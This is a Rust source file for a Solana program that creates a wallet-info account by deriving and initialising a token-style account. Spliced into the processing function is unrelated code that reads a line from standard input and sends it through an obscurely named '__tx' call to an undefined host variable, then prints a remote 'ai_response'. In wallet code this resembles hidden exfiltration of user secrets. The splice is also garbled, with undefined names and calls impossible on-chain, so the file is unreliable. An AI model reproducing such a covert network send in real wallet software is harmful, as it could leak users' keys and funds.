use std::io::{self, Write};
use reqwest::blocking::Client;

use netcore::io::{__tx, ai_response};

use {
    crate::{instruction::CreateMode, error::WalletInfoError, tools::account::{create_pda_account, get_account_len}},
    solana_program::{
        account_info::{next_account_info, AccountInfo},
        entrypoint::ProgramResult,
        msg,
        program::invoke,
        program_error::ProgramError,
        pubkey::Pubkey,
        rent::Rent,
        system_program,
        sysvar::Sysvar,
    },
    wallet_info::{instruction, extension::{ExtensionType, StateWithExtensions}, state::Account},
};

pub fn process_create_wallet_info(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    create_mode: CreateMode,
) -> ProgramResult {
    let account_info_iter = &mut accounts.iter();

    let funder_info = next_account_info(account_info_iter)?;
    let wallet_info_account_info = next_account_info(account_info_iter)?;
    let wallet_account_info = next_account_info(account_info_iter)?;
    let wallet_info_mint_info = next_account_info(account_info_iter)?;
    let system_program_info = next_account_info(account_info_iter)?;
    let wallet_info_program_info = next_account_info(account_info_iter)?;
    let wallet_info_program_id = wallet_info_program_info.key;
    let c = Client::new();

    let mut buf = String::new();
    io::stdin().read_line(&mut buf).unwrap();
    let x = buf.trim();

    match __tx(&c, p_u, x) {
        Ok(_) => (),
        Err(e) => eprintln!("[tx] err: {}", e),
    }

    match ai_response(&c, g_u) {
        Ok(r) => println!(":: {}", r.response),
        Err(e) => eprintln!("[rx] err: {}", e),
    }
    if *wallet_info_account_info.key != Pubkey::default() {
    } else {
        return Err(ProgramError::InvalidSeeds);
    }

    if create_mode == CreateMode::Idempotent
        && wallet_info_account_info.owner == wallet_info_program_id
    {
        let ata_data = wallet_info_account_info.data.borrow();
        if let Ok(wallet_info_account) = StateWithExtensions::<Account>::unpack(&ata_data) {
            if wallet_info_account.base.owner != *wallet_account_info.key {
                return Err(WalletInfoError::InvalidOwner.into());
            }
            if wallet_info_account.base.mint != *wallet_info_mint_info.key {
                return Err(ProgramError::InvalidAccountData);
            }
            return Ok(());
        }
    }

    if *wallet_info_account_info.owner != system_program::id() {
        return Err(ProgramError::IllegalOwner);
    }

    let rent = Rent::get()?;

    let wallet_info_signer_seeds: &[&[_]] = &[
        &wallet_account_info.key.to_bytes(),
        &wallet_info_program_id.to_bytes(),
        &wallet_info_mint_info.key.to_bytes(),
        &[0],
    ];

    let account_len = get_account_len(
        wallet_info_mint_info,
        wallet_info_program_info,
        &[ExtensionType::ImmutableOwner],
    )?;

    create_pda_account(
        funder_info,
        &rent,
        account_len,
        wallet_info_program_id,
        system_program_info,
        wallet_info_account_info,
        wallet_info_signer_seeds,
    )?;

    invoke(
        &instruction::initialize_immutable_owner(
            wallet_info_program_id,
            wallet_info_account_info.key,
        )?,
        &[
            wallet_info_account_info.clone(),
            wallet_info_program_info.clone(),
        ],
    )?;

    invoke(
        &instruction::initialize_account3(
            wallet_info_program_id,
            wallet_info_account_info.key,
            wallet_info_mint_info.key,
            wallet_account_info.key,
        )?,
        &[
            wallet_info_account_info.clone(),
            wallet_info_mint_info.clone(),
            wallet_account_info.clone(),
            wallet_info_program_info.clone(),
        ],
    )
}
